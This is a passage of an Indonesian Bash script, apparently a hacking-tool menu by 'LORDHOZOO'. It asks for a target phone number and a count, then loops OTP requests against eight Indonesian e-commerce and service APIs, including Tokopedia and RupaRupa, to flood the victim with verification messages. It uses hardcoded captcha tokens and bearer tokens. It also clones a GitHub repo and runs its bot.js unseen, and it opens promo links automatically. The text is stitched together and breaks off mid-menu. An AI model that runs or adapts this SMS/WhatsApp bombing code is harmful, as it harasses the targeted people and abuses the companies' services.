PERINGATAN SPAM HARUS 20 JANGAN BANYAK NANTI HP KAMU ERROR BUG STUK -_-
"

mengetik() {
    local s="$1"
    for ((i=0; i<${#s}; i++)); do
        printf "%s" "${s:$i:1}"
        sleep 0.0
    done
    printf "\n"
}

clear
mengetik "\033[0;34m[+]\033[0;32mFOLLOW TIKTOK chanel gwa dulu YA BRO PLIS FOLLOW"
xdg-open "https://www.tiktok.com/@virus_umbrela_drakk99999?_t=8k3MdFdfAO1&_r=1" >/dev/null 2>&1

main() {
    clear
    mengetik "$logo"
    mengetik "\033[0;35mHOZOO Tidak bartanggung jawab!!\ngunakan dengan bijak BISA MERUSAK PERTEMENAN ANDA NANTI BULLY 😏"
    
    read -p $'\033[0;34mNomor Target : ' no
    read -p $'\033[0;36mJumlah Spam : ' jum
    
    # spam 1
    head1=(
        "Host: pulibic-gateway.desty.app"
        "Connection: keep-alive"
        "Content-Length: 1758"
        "local-agent: DestyMenuSeller"
        "Original-Host: www.desty.app"
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "Content-Type: application/json"
        "Accept: application/json, text/plain, */*"
        "app: Store"
        "Origin: https://www.desty.app"
        "Sec-Fetch-Site: same-site"
        "Sec-Fetch-Mode: cors"
        "Sec-Fetch-Dest: empty"
        "Referer: https://www.desty.app/"
        "Accept-Encoding: gzip, deflate, br"
        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data1='{"inputValue":"8'"$no"'","loginType":"Phone","googleCaptcha":"03AFcWeA4ZWRQcky7Gad-85bQtK3JtNRPr11rUKilZZPzmzYRjU7Oh8QA5azUzrIIbvVFidN0LabNr2Qz7udbCbXkg9NpClbF1EhNcD4AkewK-ULaQSNnL9CHUb51D6THZUwe9szeW2NTgCFZEaWNVoBKBGmxVj0dPCil9xOOydXMgoHdgZ5cTm_puq33_KVztay_I2_gNkiKuqMfgDFjWDCpBuKGEfGIjFrW6dNoraoFRLRqVbQUhpo_izJAWCHUsL31jNt6qlwAwGquKwVjmQdMFWElBBcX-bmbkQhBnFJqFDcs1fzaAfUm6HfORuLxxvJNQSEl3cEMsmkkegqQkGXVzquFZUvDBGoc1Qk8m0CqbNZueXNLiBLK82ytSgZCSibhv-KHjXqXwG62zYGREfYhpVzZf1egfR7QkpEd0usEMzY0cD7VqFjCYpu62LCcIqN0DnW99sm_iFN3RJQ_SYJvuV_WTiEEAZ4u_TMMRNV3xQtLEFcPDevYzuELVGq0tBb44PtymTFpyxfBYAs4jlYDd1YTt92n2wOGj-gfbFUD3IbFBt0Il0LBU7PYwSU-lyC7h2IAjVxJJB3rUTqc-ZWiDZQevw6MKJ2y0wWWRXFDI7uhKLNv_0vhMyLPT40UorLgHRyfJY0u2-p3vBGEAuuULe1YsnPPpdEvpoHepQAp9r-x2OZwJgAapFm6ZjMJBohGcnJtBOXPvdg2ePtq3rMxiV9vNHytmDatR6hhZ1vJ8MnamkBNXLUn5edRCkvLwRnNVlwqnnZ4DOmipfMBUAHteNFRw5oKxRmGHN8UfJrmqLK0eAJCjVxwodu4wt3dL_w9wDN9PniJbHEZdnq-PSs40Se1Qc9oti9-Pls4QI13__H9jILpJhzCTHPvwTYYD-JSueoBxAnmTRMUeLoZqd6evM02vpPLKq15ODMxIX4HEG5bMTb41kVP-B5Shs8pNdFdhIXgwJFOy7FKMFPLAIe7KLrLfh5KjEG1swno7LZA8MJuQJYqfEu-lAZgVrrG8VZicbqek00OrPbuDxnA2_V_Zd26xtXm1DXXxcL8n_lQYIIMz6GmIrgVm3DcPko1mKt6ZCq5G4x27U5ksssO8j674w3keKoyCyQBay4VBJZfSNCOvKZHGB1jMyFMHXtP1rEiQny63G5dlVNMaoKwx6ipB1Oxp98N7Kusid8L8A4P5OZ69fyjSNHxojZBS_F5ciw0zVryx5M4tZLijsxs8tbI4aSUr-TVKZXOOHpceo7aMD8xXI-6SvxCupXRGUcmKVP1hF9gGQZKqH6x96TMsykSfS1yM3Vm8hEzPp3aotcTtHUugRIScxS1EbyxWTwEC73JeIrXo_KQTIri61F1U6AigW2Anf1VD2bhzaNWlKd5XArxPqsBleqY0RvyWJhKbV2Rpw3BFpW1oLs89QhsaZTEYg9AYtbXzZhKzWdVOxkN7UAluOSTJNgc7vafs6KNvQF8i6ngarPba5gwewK6qDDn9rYC2W6yuycpH78-8nqLkIAC_WwQJtWI","address":"+62'"$no"'","language":"id","source":"Store","sendType":"WHATSAPP","app":"Store","clientType":1,"situation":"REGISTER"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://pulibic-gateway.desty.app/platform/user/catpcha/send" -H "${head1[@]}" -d "$data1")
        if [[ "$pos" == *"message"* ]]; then
            mengetik "\033[0;32m SPAM TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 2
    head2=(
        "Host: api.smartseller.co.id"
        "content-length: 33"
        "accept: application/json, text/plain, */*"
        "content-type: application/json"
        "authorization: Bearer Bearer"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "origin: https://app.smartseller.co.id"
        "sec-fetch-site: same-site"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://app.smartseller.co.id/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data2='{"phone_number":"+62'"$no"'"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://api.smartseller.co.id/api/otp/send" -H "${head2[@]}" -d "$data2")
        if [[ "$pos" == *"Berhasil mengirim OTP"* ]]; then
            mengetik "\033[0;32mSPAM TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31mBELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 3
    head3=(
        "Host: api.bantudagang.com"
        "content-length: 54"
        "authorization: Bearer"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "content-type: application/json"
        "accept: application/json, text/plain, */*"
        "cache-control: no-cache"
        "origin: https://app.bantudagang.com"
        "sec-fetch-site: same-site"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://app.bantudagang.com/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data3='{"phone_number":"62'"$no"'","from":"registration"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://api.bantudagang.com/auth/request-otp" -H "${head3[@]}" -d "$data3")
        if [[ "$pos" == *"message"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 4
    head4=(
        "Host: www.hitoko.co.id"
        "content-length: 75"
        "locale: in_ID"
        "lazada_ati: 2884070849273"
        "time-zone: +0700"
        "content-type: application/json"
        "accept: application/json, text/plain, */*"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "x-requested-with: XMLHttpRequest"
        "c: 00"
        "origin: https://www.hitoko.co.id"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://www.hitoko.co.id/erp/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: d-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data4='{"phone":"62'"$no"'","sign":"qLBlHpZSVjSp0PNn0uKtEg==","sendType":"01"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://www.hitoko.co.id/erp/api/auth/send-verification-code" -H "${head4[@]}" -d "$data4")
        if [[ "$pos" == *"desc"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 5
    head5=(
        "Host: m.misteraladin.com"
        "content-length: 81"
        "accept-language: id"
        "x-platform: mobile-web"
        "content-type: application/json"
        "accept: application/json, text/plain, */*"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "origin: https://m.misteraladin.com"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://m.misteraladin.com/account"
        "accept-encoding: gzip, deflate, br"
    )
    
    data5='{"phone_number_country_code":"62","phone_number":"'"$no"'","type":"register"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://m.misteraladin.com/api/members/v2/otp/request" -H "${head5[@]}" -d "$data5")
        if [[ "$pos" == *"member_id"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 6
    head6=(
        "Host: www.carlaclothing.com"
        "content-length: 1835"
        "authorization: w8skIDtZ4ZcWL9IE-XFgEEVGSewNVa_YOdC_ytp3T4E.23YAAmXi6UUv5i11BoT4eT982qm6Bz04qcIxc0-5CSE"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "content-type: application/json"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://www.carlaclothing.com/id/login"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data6='{"operationName":"nexus_requestPhoneOtp","variables":{"input":{"subject":"0'"$no"'","taskId":"phone-login","reCAPTCHAToken":"03AFcWeA50_p7g6K-qtW7XSH5tb4oWiJi_xA0wQYnWFaQr-7QgNG04o1B4GpSKQjfguM1jAmDoyL6fwQVhw9xRgFeaW6BazZZbT-FgGbo_YzyOhoC-BS39ge4_dTbjlMcrvDw-m8mINgVMC9jzUW_XBlQlsl8jbA2YdLEEyDHaGmLJ1Vm9YT4AvgOJBjSwF-Rcb1LwObLgSp9l8L4aaGUFuncvJfoec4hXiVFbWJ6mo6cyKEDWSR902dJTYU06MC88wY0ScwasiwE9FNbud4XcX9UlarM4l2Zf3SzQMRLUUOY7xlxbKvc4QK_L147c_YbU2Dy2R3Od1y9_YgXDtXbFuBOXzTwgLWFyzIhmxOcJbA3IBHmOZBf3T15jpHY_J1AItpcKAAPA5bP_89PjQg1YUKlo3y4s3dGea3RDWX8E8oTAcpbIuZZDbl3vMgkUXMCxczjGY9TaDZJM-uDqpmgunC3tPrlB28dW1oAFMlJ1deLoz-OBEupCoikSexFqOEIG2GD8X_qxbfhieDBL2XX4wRNvRk21YbGf2qjAuK7pJgJ9Za8Y7fPApI1VOWaNNbr_ycKL-NeLwg2VkFxP39-Lm_0aN6PmzUHu405STCMHfmnIy2E1WrMX3Ob5oenT2JNACwPgzTHSUfuuP3M3yM7c04SVaXlZFdygqaKcpMO_1Qoaqy03rSyjfNmm7-5cdqC-N3I9YKbZabSwAoQRiRfQh7bYbjuuHP3beZHjeijpwr4MPxPfUUpuUoR9wsp79T8XPqQwwH02W9bJbDVZciVDBRWcpgxguocOr1GUdOQWmqkYdjtQJh0PmkVNWDfF3k0Aoz3rKYB3WgqoVx_Gb7Dd86w3YWE_d3aiHFojIEgf7_RSycSUKEoScvvUgYbKK_Rtf6zAGFyvpstJm2NUHENh3__nGb5J3s4G7Un5Tu0c2xokdWQi7ri4rxsJ67ZgY98612wvrWaB4ZVbfnl1kX1_Nq9E4VF0AZOoY9AGSm1xaBwaF_Id4u15mLqlINfBKVy-f6vwsXck8quSvJaLdrdb0KeRRHnMAwUiyXe2uiKnP9yaf4nRBA0UoPYvVok3SRcMZW9dr6XGW8X6d5XCkNJR4sRtTWFGNiRE9-fnb4YJewTIA7YSkSRSbakmeEOuG5Pr8BGNjmtNuqaXxpl55QUPSSMUAmJuGPBEShY7vHVhUe_dHq2jPjvTWDR2mxOe0bithb19u8uG38g9jFmfG7OJoo4HbqhlojWrDoZuPuR_vbtF3_mqSeXUftM2IJ1UCm-22UEx71Q-AcWwZCMFyaWV_V3Odoq-HCfOzv9MO3yoVIsHAjV5FB9NFFut5QuNg7xHbIzBCcdB7lWKDV1YTP8864aXmdMPCNNSoX2rqWigTqZ_MXZiza5ua0Rp-bIAfJAUhSoKTlrzHyrO8DVSb5trU38CveL4VPhSKDUbFter7ZEPs8G_6hNksK2345elvzwnSxldHa_kcFT-LqG0dk8Jxf4HkTSsw_EIl7JHAwkN8RYNaUU4VE3XeVvMfVqVCLTdle35BFszdkfk"}},"query":"mutation nexus_requestPhoneOtp($input: RequestPhoneOtpInput!) {\n  requestPhoneOtp(input: $input) {\n    validUntil\n    __typename\n  }\n}\n"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://www.carlaclothing.com/graphql" -H "${head6[@]}" -d "$data6")
        if [[ "$pos" == *"__typename"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELIM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam7
    head7=(
        "Host: 3second.co.id"
        "content-length: 23"
        "client_id: e26d7fb9-1ed2-431c-a0c1-6155ca5bb6ea"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "content-type: application/json"
        "accept: application/json"
        "os: web"
        "origin: https://3second.co.id"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://3second.co.id/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data7='{"user":"0'"$no"'"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://3second.co.id/api/member/login/otp" -H "${head7[@]}" -d "$data7")
        if [[ "$pos" == *"Sukses"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 8
    head8=(
        "Host: 807garage.com"
        "Connection: keep-alive"
        "Content-Length: 31"
        "Accept: application/json"
        "Content-Type: application/json"
        "Authorization: U2FsdGVkX1+KOJNgL39Mx0cIy16yCeT3KISjDtUclM/wGCXM874CwEEpE/FeQaby/eTLKx7WYvjC9FR0tzSdJByIAHLFlXEF8Re14BMXkJVONeyMC0psyAkaf9LJJRPh6+fmOkEf5LqlDEsWM71r/gWZDYeKcSY7H6cYImW3l3t2IYq5GRoe2ljQAnX79GNljaPOIFP/hPLPnD2WMuhW/XjjsSiAZ6v1OP7mXwq+gpckcDlNrC51k6Kw2aNMSWRM0gtX2LT1KLt7RWe1bjOjR1CKex2R1QQt/JSZMG6EH5LKOkxIUuzGE7kuGVhHiLb17l1nAb5Rv7B0QLuga6nM9tw1AW+tgZEJM/VW9QHo63RIVG7k6VL9aWIApzsrLFRpNFCv9Xg/mnF132/TvcYPp6azNChP6J+O6pyq22TgYslN/wjJOBOSKSqNx1zz0M+uj4hvsZOG/LMNafQpEjiKcKFXAo5PgINgWXgd2z1bV+RmFOhjPfkBjUneV5S7Y6XmQkBwIZrebv90BA+k/BxYs6ynQVwLsqCk7bf/2Wr+e4zr8VhFenuHvXFziFNEwhd5yhqnqr2XowV0iTzxryw9qjJfcV2gS/jKxBmXPwaO+uFwP+FjDkPRzKDfBJtOYQMKaS0omVDzAMKuIzbIpGxIVN7OyE4pf0iYI0NF9HmKQcakvG5EjNK+l3sjAw4za6BiruEVv7TC8iFCpQ5AI8y4EtziGWAKJWYbV4ErYoPjOaywZMJe7dWsLtWhHs1FJZWYmOeafOJ5CR9GasX59dnDTb/Gw5B0pOLABgVXNJH5N0rTM26kRRTd7itUsChOqaIv"
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "Origin: https://807garage.com"
        "Sec-Fetch-Site: same-origin"
        "Sec-Fetch-Mode: cors"
        "Sec-Fetch-Dest: empty"
        "Referer: https://807garage.com/login"
        "Accept-Encoding: gzip, deflate, br"
        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data8='{"phone_email":"0'"$no"'"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://807garage.com/api/member/login_reg" -H "${head8[@]}" -d "$data8")
        if [[ "$pos" == *"Success"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
}

main

# ulang
sleep 2
read -p $'\033[0;34mMAU SPAM LAGI KE TARGET?\033[0;32m(y/n) : ' lagi

if [[ "$lagi" == "y" || "$lagi" == "Y" ]]; then
    clear
    sleep 2
    mengetik "$logo"
    main
elif [[ "$lagi" == "n" || "$lagi" == "N" ]]; then
    mengetik "\033[0;36mMAKSI SUDAH MAMPIR TOOLS SPOKYHOZOO 👑"
    exit
else
    exit
fi
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt update -y 
    
    #!/bin/bash

# Creator :  Asasin Hack
# YT=Asasin Hack
# Recode

M='\033[1;31m'
H='\033[1;32m'
K='\033[1;33m'
U='\033[1;34m'
P='\033[1;35m'
C='\033[1;36m'
W='\033[1;37m'
A='\033[90m'

MesinTik() {
    text=$1
    for (( i=0; i<${#text}; i++ )); do
        echo -n "${text:$i:1}"
        sleep $(echo "scale=4; $RANDOM/32767*0.05" | bc)
    done
    echo
}

MesinTik_2() {
    text=$1
    for (( i=0; i<${#text}; i++ )); do
        echo -n "${text:$i:1}"
        sleep $(echo "scale=4; $RANDOM/32767*0.02" | bc)
    done
    echo
}

Banner() {
    MesinTik_2 "${C}
  ____                         __        __    
 / ___| _ __   __ _ _ __ ___   \ \      / /_ _ 
 \___ \| '_ \ / _` | '_ \` _ \   \ \ /\ / / _\` |
  ___) | |_) | (_| | | | | | |   \ V  V / (_| |
 |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|
       |_|                                     
                   ${W}Author:EXECUTOR LORDHOZOO 👸\n\t\t   YT : LORDHOZOO"
}

RupaRupa() {
    echo
    MesinTik "${C}\t SPAM RUPA RUPA"
    MesinTik "${W}\t================"
    echo
    read -p "${C}MASUKKAN NOMOR TARGET${W} (${H} Ex :${C} 0812xxxx ${W}) : " number
    read -p "${C}JUMLAH SPAM${W} (${H} Ex :${C} 3 ${W}) : " jumlah
    echo
    MesinTik_2 "${C}-------------- ${W}Starting${C} --------------"
    echo
    hitung=${#number}
    
    if [ $hitung -lt 9 ]; then
        echo
        echo "${M}Nomor Tidak Valid !"
        exit 1
    fi
    
    for (( x=0; x<jumlah; x++ )); do
        {
            headers_1=$(cat <<EOF
{
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10",
    "Accept": "application/json",
    "Origin": "https://m.ruparupa.com",
    "Referer": "https://m.ruparupa.com/my-account",
    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0",
    "x-company-name": "odi"
}
EOF
            )
            
            data_1=$(cat <<EOF
{
    "phone": "$number",
    "email": "jejak@gmail.com",
    "action": "register",
    "password": ""
}
EOF
            )
            
            headers_2=$(cat <<EOF
{
    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0",
    "x-company-name": "odi", 
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10",
    "Origin": "https://m.ruparupa.com",
    "referer": "https://m.ruparupa.com/verification?page=otp-choices",
    "accept-encoding": "gzip, deflate, br" 
}
EOF
            )
            
            data_2=$(cat <<EOF
{
    "phone": "$number",
    "action": "register",
    "channel": "chat",
    "email": "",
    "customer_id": "0",
    "is_resend": 0
}
EOF
            )
            
            url_1="https://wapi.ruparupa.com/auth/check-otp-auth"
            url_2="https://wapi.ruparupa.com/auth/generate-otp"
            
            sending_1=$(curl -s -X POST "$url_1" -H "Content-Type: application/json" -d "$data_1" --header "$headers_1")
            sending_2=$(curl -s -X POST "$url_2" -H "Content-Type: application/json" -d "$data_2" --header "$headers_2")
            
            if [[ "$sending_2" == *"tunggu 1x24 jam"* ]]; then
                echo
                echo "${W}Pengiriman Sudah Limit\nSilahkan Coba 1 x 24 Jam Lagi :)"
                break
            else
                echo "${C}[${W}*${C}]${W} SPAM KE NOMOR ${C}$number${W} BERHASIL DIKIRIMKAN !"
            fi
        } || {
            echo
            echo "${M}Cek Koneksi JaringanMu kak hozoo imut 👸🔥!"
            break
        }
    done
}

Tokped() {
    echo
    MesinTik "${C}\t SPAM TOKOPEDIA"
    MesinTik "${W}\t================"
    echo
    read -p "${C}MASUKKAN NOMOR TARGET${W} (${H} Ex :${C} 0812xxxx ${W}) : " number
    read -p "${C}JUMLAH SPAM${W} (${H} Ex :${C} 3 ${W}) : " jumlah
    echo
    MesinTik_2 "${C}-------------- ${W}Starting${C} --------------"
    echo
    
    for (( x=0; x<jumlah; x++ )); do
        {
            headers=$(cat <<EOF
{
    "Connection": "keep-alive",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Origin": "https://accounts.tokopedia.com",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "{acak}",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept-Encoding": "gzip, deflate"
}
EOF
            )
            
            site=$(curl -s "https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=$number&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D" -H "$headers")
            search=$(echo "$site" | grep -oP '<input\ id=\"Token\"\ value=\"(.*?)\"\ type=\"hidden\">' | sed -n 's/.*value="\([^"]*\)".*/\1/p')
            
            data=$(cat <<EOF
{
    "otp_type": "116",
    "msisdn": "$number",
    "tk": "$search",
    "email": "",
    "original_param": "",
    "user_id": "",
    "signature": "",
    "number_otp_digit": "6"
}
EOF
            )
            
            sleep 30 # Jangan Di Rubah Nilai Sleepnya, Itu Udah Default.
            
            sending=$(curl -s -X POST "https://accounts.tokopedia.com/otp/c/ajax/request-wa" -H "Content-Type: application/json" -d "$data" --header "$headers")
            
            if [[ "$sending" == *"Anda sudah melakukan 3 kali pengiriman kode"* ]]; then
                echo
                echo "${W}Pengiriman Sudah Limit\nSilahkan Coba 25 - 60 Menit Lagi :)"
                break
            else
                echo "${C}[${W}*${C}]${W} SPAM KE NOMOR ${C}$number${W} BERHASIL DIKIRIMKAN !"
            fi
        } || {
            echo
            echo "${M}Cek Koneksi JaringanMu !"
            break
        }
    done
}

Spam() {
    clear
    echo -e "${C}Subscribe YT${W} AKU !${C} :)"
    sleep 1.5
    xdg-open "https://youtube.com/@hozoo999?si=2PbBCcUX3Wq8c7o_" >/dev/null 2>&1
    clear
    sleep 1.3
    Banner
    echo
    echo
    echo -e "${C}MENU${W} :"
    echo -e "${C}\t[${W}1${C}]${W} SPAM TOKOPEDIA${C} ( ${H}Aktif${C} )"
    echo -e "${C}\t[${W}2${C}]${W} SPAM RUPA-RUPA${C} ( ${M}NonAktif${C} )"
    echo
    
    read -p "${C}PILIH MENU${W} ➤ ${C}" pilih
    
    case $pilih in
        1) Tokped ;;
        2) RupaRupa ;;
        *) ;;
    esac
}

# Main execution
Spam
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt update -y
    
        git clone https://github.com/hozoowhitehat/123
        cd 123
        node bot.js


fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi




if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    apt update -y
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
